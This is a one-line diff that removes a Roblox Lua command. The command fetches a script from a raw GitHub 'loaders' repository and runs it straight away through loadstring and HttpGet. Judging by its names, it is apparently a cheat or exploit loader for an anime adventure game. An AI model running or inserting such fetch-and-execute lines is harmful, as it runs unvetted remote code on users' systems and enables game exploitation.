@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/april-fool-s-anime-adventures-spam3-ihmfts1lmbpiub.lua"))()
